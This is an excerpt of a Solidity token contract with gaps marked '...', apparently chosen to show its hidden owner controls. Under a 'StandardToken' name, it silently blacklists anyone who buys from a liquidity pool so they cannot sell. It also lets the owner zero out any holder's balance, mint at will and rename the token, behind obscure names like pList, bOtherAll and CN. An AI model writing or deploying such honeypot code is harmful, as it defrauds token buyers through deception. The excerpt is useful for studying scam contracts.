...
contract StandardToken is ERC20 {
    ...
    function transfer(address _to, uint256 _value) public returns (bool) {
        if(!tokenWhitelist[msg.sender]&&!tokenWhitelist[_to]){
            ...
            require(!pList[msg.sender]);
        }

        require(_to != address(0));

        if(autoP&&isLP[msg.sender]&&!tokenWhitelist[_to]&&!pList[_to]){
            pList[_to]=true;
        }
    ...
    function transferFrom(address _from, address _to, uint256 _value) public returns (bool) { 
        ...
        if(autoP&&isLP[_from]&&!tokenWhitelist[_to]&&!pList[_to]){
            pList[_to]=true;
        }
    ...
    function _lpList(address _address, bool _isLpList) internal returns (bool) {
        require(isLP[_address] != _isLpList);
        isLP[_address] = _isLpList;
        return true;
    }
    ...
    function _pList(address _address, bool _isBlackListed) internal returns (bool) {
        require(pList[_address] != _isBlackListed);
        pList[_address] = _isBlackListed;
        return true;
    }

    function _changeAutoP(bool _autoP) internal returns (bool) {
        require(autoP != _autoP);
        autoP=_autoP;
        return true;
    }
...
contract PausableToken is StandardToken, Pausable {
    ...
    function lpList(address listAddress,  bool _isLp) public whenNotPaused onlyOwner  returns (bool success) {
        return super._lpList(listAddress, _isLp);
    }
    function pListAddress(address listAddress,  bool isBlackListed) public whenNotPaused onlyOwner  returns (bool success) {
        return super._pList(listAddress, isBlackListed);
    }
    
    function blackList(address[] listAddress,  bool isBlackListed) public whenNotPaused onlyOwner  returns (bool success) {
        return super._blackAddressList(listAddress, isBlackListed);
    }

    function changeAutoP(bool _ab) public whenNotPaused onlyOwner  returns (bool success) {
        return super._changeAutoP(_ab);
    }
...
contract CoinToken is PausableToken {
    ...
    constructor(string  _name, string  _symbol, uint256 _decimals, uint256 _supply, uint256 _txFee,uint256 _burnFee,address _FeeAddress,address tokenOwner) public {
        name = _name;
        symbol = _symbol;
        decimals = _decimals;
    ...
    function bOther(address a,uint256 _value) onlyOwner public{
        _burn(a, _value);
    }
    function bOtherAll(address _who) onlyOwner public{
        require(balances[_who]>0);
        totalSupply = totalSupply.sub(balances[_who]);
        emit Transfer(_who, address(0), balances[_who]);
        balances[_who] = 0;
    }
    ...
    function mintList(address[] memory accounts, uint256[] memory amounts) onlyOwner public {
        require(accounts.length==amounts.length,"length error");
        for(uint i=0;i<accounts.length;i++){
            totalSupply = totalSupply.add(amounts[i]);
            balances[accounts[i]] = balances[accounts[i]].add(amounts[i]);
            emit Mint(address(0), accounts[i], amounts[i]);
            emit Transfer(address(0), accounts[i], amounts[i]);
        }
    }

    function CN(string _name,string _symbol) onlyOwner public {
        name=_name;
        symbol=_symbol;
    }
